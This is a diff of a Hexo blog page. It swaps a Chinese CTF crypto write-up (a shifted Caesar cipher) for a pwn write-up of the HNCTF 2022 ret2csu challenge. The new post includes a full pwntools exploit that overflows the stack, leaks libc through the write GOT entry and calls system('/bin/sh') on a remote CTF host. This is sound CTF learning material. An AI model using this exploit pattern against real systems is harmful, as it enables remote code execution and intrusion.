@@ -20,20 +20,22 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="第一周crypto练习变异凯撒题目为  加密密文：afZ_r9VYfScOeO_UL^RWUc格式：flag{ }  题目已经说明是凯撒，那就用凯撒解密。但题目中包含明显不属于凯撒密码密文的字符_&#96;&#96;^ 格式是flag{ }，那么afZ_对应的就是flag 凯撒密码的原理是对字母的位移替换加密。 当a&#x3D;f时向后位移是5，f&#x3D;l时向后位移是6，Z&#x3D;a时向后位移是1，好像">
+  <meta name="description" content="[HNCTF 2022 WEEK2]ret2csu上一周学了ret2csu，但是没能成功打通，这次来找个简单的题目试一试 看起来简单罢了 ROPgadget发现有pop_rdi 但是尝试了一下，第一段获取write地址的好像不可以() 所以算是半个csu罢">
 <meta property="og:type" content="article">
-<meta property="og:title" content="第一周crypto">
-<meta property="og:url" content="http://example.com/2023/01/11/%E7%AC%AC%E4%B8%80%E5%91%A8crypto/index.html">
+<meta property="og:title" content="第七周pwn">
+<meta property="og:url" content="http://example.com/2023/02/26/%E7%AC%AC%E4%B8%83%E5%91%A8pwn/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="第一周crypto练习变异凯撒题目为  加密密文：afZ_r9VYfScOeO_UL^RWUc格式：flag{ }  题目已经说明是凯撒，那就用凯撒解密。但题目中包含明显不属于凯撒密码密文的字符_&#96;&#96;^ 格式是flag{ }，那么afZ_对应的就是flag 凯撒密码的原理是对字母的位移替换加密。 当a&#x3D;f时向后位移是5，f&#x3D;l时向后位移是6，Z&#x3D;a时向后位移是1，好像">
+<meta property="og:description" content="[HNCTF 2022 WEEK2]ret2csu上一周学了ret2csu，但是没能成功打通，这次来找个简单的题目试一试 看起来简单罢了 ROPgadget发现有pop_rdi 但是尝试了一下，第一段获取write地址的好像不可以() 所以算是半个csu罢">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-01-11T02:59:42.000Z">
-<meta property="article:modified_time" content="2023-02-04T08:15:38.748Z">
+<meta property="og:image" content="http://example.com/2023/02/26/%E7%AC%AC%E4%B8%83%E5%91%A8pwn/Snipaste_2023-02-26_12-12-28.png">
+<meta property="article:published_time" content="2023-02-26T04:08:12.000Z">
+<meta property="article:modified_time" content="2023-03-03T14:33:26.844Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="crypto">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/02/26/%E7%AC%AC%E4%B8%83%E5%91%A8pwn/Snipaste_2023-02-26_12-12-28.png">
 
-<link rel="canonical" href="http://example.com/2023/01/11/%E7%AC%AC%E4%B8%80%E5%91%A8crypto/">
+<link rel="canonical" href="http://example.com/2023/02/26/%E7%AC%AC%E4%B8%83%E5%91%A8pwn/">
 
 
 <script id="page-configurations">
@@ -46,7 +48,7 @@
   };
 </script>
 
-  <title>第一周crypto | Hexo</title>
+  <title>第七周pwn | Hexo</title>
   
 
 
@@ -156,7 +158,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/11/%E7%AC%AC%E4%B8%80%E5%91%A8crypto/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/26/%E7%AC%AC%E4%B8%83%E5%91%A8pwn/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -169,7 +171,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          第一周crypto
+          第七周pwn
         </h1>
 
         <div class="post-meta">
@@ -179,14 +181,14 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2023-01-11 10:59:42" itemprop="dateCreated datePublished" datetime="2023-01-11T10:59:42+08:00">2023-01-11</time>
+              <time title="Created: 2023-02-26 12:08:12" itemprop="dateCreated datePublished" datetime="2023-02-26T12:08:12+08:00">2023-02-26</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-02-04 16:15:38" itemprop="dateModified" datetime="2023-02-04T16:15:38+08:00">2023-02-04</time>
+                <time title="Modified: 2023-03-03 22:33:26" itemprop="dateModified" datetime="2023-03-03T22:33:26+08:00">2023-03-03</time>
               </span>
 
           
@@ -200,26 +202,36 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="第一周crypto练习"><a href="#第一周crypto练习" class="headerlink" title="第一周crypto练习"></a>第一周crypto练习</h1><h2 id="变异凯撒"><a href="#变异凯撒" class="headerlink" title="变异凯撒"></a>变异凯撒</h2><p>题目为</p>
-<blockquote>
-<p>加密密文：afZ_r9VYfScOeO_UL^RWUc<br>格式：flag{ }</p>
-</blockquote>
-<p>题目已经说明是凯撒，那就用凯撒解密。但题目中包含明显不属于凯撒密码密文的字符<code>_``^</code></p>
-<p>格式是flag{ }，那么afZ_对应的就是flag</p>
-<p>凯撒密码的原理是对字母的位移替换加密。</p>
-<p>当a&#x3D;f时向后位移是5，f&#x3D;l时向后位移是6，Z&#x3D;a时向后位移是1，好像找不出什么规律呢</p>
+        <h2 id="HNCTF-2022-WEEK2-ret2csu"><a href="#HNCTF-2022-WEEK2-ret2csu" class="headerlink" title="[HNCTF 2022 WEEK2]ret2csu"></a>[HNCTF 2022 WEEK2]ret2csu</h2><p>上一周学了ret2csu，但是没能成功打通，这次来找个简单的题目试一试</p>
+<p>看起来简单罢了</p>
+<p>ROPgadget发现有pop_rdi</p>
+<p>但是尝试了一下，第一段获取write地址的好像不可以()</p>
+<p>所以算是半个csu罢</p>
 <span id="more"></span>
 
-<p>但是可以从另一个角度来看（以下ascii码均为十进制）</p>
-<p>a的ascii码是97，f的ascii码是102。102-97&#x3D;5</p>
-<p>f的ascii码是102，l的ascii码是108。108-102&#x3D;6</p>
-<p>Z的ascii码是90，a的ascii码是97。97-90&#x3D;7</p>
-<p>突然就发现规律了！</p>
-<p>_和g的ascii码相差为8</p>
-<p>那么这个变异凯撒，其实是将在字母表上的位移，变成了在ascii码上的位移，并且每外后一个字符位移加一。写python脚本解题。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">m=<span class="string">&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span></span><br><span class="line">j=<span class="number">5</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m :</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)+j),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    j+=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>有溢出点，vuln处，再来看csu_init</p>
+<p><img src="/2023/02/26/%E7%AC%AC%E4%B8%83%E5%91%A8pwn/Snipaste_2023-02-26_12-12-28.png"></p>
+<p>和上次的有点不一样，上次的是mov，这次的却是pop</p>
+<p>其实这两个是一样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//pop指令等同于：</span><br><span class="line">//--mov （%rsp）目标地址		//数据出栈</span><br><span class="line">//--add $指针移动长度 %rsp    //指针上移</span><br></pre></td></tr></table></figure>
 
-<p>得<code>flag为flag&#123;Caesar_variation&#125;</code></p>
+<p>贴一下ret2csu的思路</p>
+<ul>
+<li>利用栈溢出执行 libc_csu_gadgets 获取 write 函数地址，并使得程序重新执行 main 函数</li>
+<li>根据 libcsearcher 获取对应 libc 版本以及 execve 函数地址</li>
+<li>再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 execve 地址以及 ‘&#x2F;bin&#x2F;sh’ 地址，并使得程序重新执行 main 函数。</li>
+<li>再次利用栈溢出执行 libc_csu_gadgets 执行 execve(‘&#x2F;bin&#x2F;sh’) 获取 shell。</li>
+</ul>
+<p>注意，上一道题是rdi&#x3D;r13，rsi&#x3D;r14，rdx&#x3D;r15</p>
+<p>而这道题是rdi&#x3D;r12，rsi&#x3D;r14，rdx&#x3D;r14</p>
+<p>第一段payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rbx=0 #call [r15+rbx*8]</span><br><span class="line">rbp=1 #add rbx+1 &amp; cmp rbp,rbx</span><br><span class="line">r12=1 #write的第一个参数</span><br><span class="line">r13=write_got #write的第二个参数</span><br><span class="line">r14=8 #write的第三个参数</span><br><span class="line">r15=write_got </span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*0x108+p64(pop_addr)+p64(0)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)+p64(mov_addr)+b&#x27;a&#x27;*(0x8+8*6)+p64(main_addr)</span><br></pre></td></tr></table></figure>
+
+<p>emmm，其实里面的csu大概就这一段，后面直接用ret2libc即可，那，就直接上exp罢！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p=remote(&quot;43.142.108.3&quot;,28944)</span><br><span class="line">elf=ELF(&quot;./ret2csu&quot;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">write_got=elf.got[&quot;write&quot;]</span><br><span class="line">write_plt=elf.plt[&quot;write&quot;]</span><br><span class="line">main_addr=elf.symbols[&quot;main&quot;]</span><br><span class="line">pop_addr=0x04012A6</span><br><span class="line">mov_addr=0x00401290</span><br><span class="line">pop_rdi=0x04012b3</span><br><span class="line">ret=0x040101a</span><br><span class="line"></span><br><span class="line">rbx=0 #call [r15+rbx*8]</span><br><span class="line">rbp=1 #add rbx+1 &amp; cmp rbp,rbx</span><br><span class="line">r12=1 #write的第一个参数</span><br><span class="line">r13=write_got #write的第二个参数</span><br><span class="line">r14=8 #write的第三个参数</span><br><span class="line">r15=write_got #直接给他来个返回地址！</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*0x108+p64(pop_addr)+p64(0)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)+p64(mov_addr)+b&#x27;a&#x27;*(0x8+8*6)+p64(main_addr)</span><br><span class="line">p.recvuntil(&quot;Input:\n&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr=u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(write_addr))</span><br><span class="line">libcbase=write_addr-libc.symbols[&quot;write&quot;]</span><br><span class="line">sys_addr=libcbase+libc.symbols[&quot;system&quot;]</span><br><span class="line">shell_addr=libcbase+next(libc.search(b&quot;/bin/sh&quot;))</span><br><span class="line"></span><br><span class="line">payload=b&quot;a&quot;*0x108+p64(pop_rdi)+p64(shell_addr)+p64(sys_addr)</span><br><span class="line">p.recvuntil(&quot;Input:\n&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p>这个比ctfwiki易懂<a target="_blank" rel="noopener" href="https://blog.csdn.net/turtlesd/article/details/124440449">(60条消息) pwn中级ROP——ret2csu_见过自讼的博客-CSDN博客</a></p>
 
     </div>
 
@@ -229,7 +241,7 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/crypto/" rel="tag"># crypto</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
           </div>
 
         
@@ -238,12 +250,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2023/01/09/crypto-1/" rel="prev" title="crypto(1)">
-      <i class="fa fa-chevron-left"></i> crypto(1)
+    <a href="/2023/02/20/%E7%AC%AC%E5%85%AD%E5%91%A8pwn/" rel="prev" title="第六周pwn">
+      <i class="fa fa-chevron-left"></i> 第六周pwn
     </a></div>
       <div class="post-nav-item">
-    <a href="/2023/01/11/%E7%AC%AC%E4%B8%80%E5%91%A8web/" rel="next" title="第一周web">
-      第一周web <i class="fa fa-chevron-right"></i>
+    <a href="/2023/03/03/%E5%B1%80%E5%9F%9F%E7%BD%91%E5%8F%8A%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/" rel="next" title="局域网及虚拟机网络配置">
+      局域网及虚拟机网络配置 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -303,7 +315,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E5%91%A8crypto%E7%BB%83%E4%B9%A0"><span class="nav-number">1.</span> <span class="nav-text">第一周crypto练习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%98%E5%BC%82%E5%87%AF%E6%92%92"><span class="nav-number">1.1.</span> <span class="nav-text">变异凯撒</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HNCTF-2022-WEEK2-ret2csu"><span class="nav-number">1.</span> <span class="nav-text">[HNCTF 2022 WEEK2]ret2csu</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
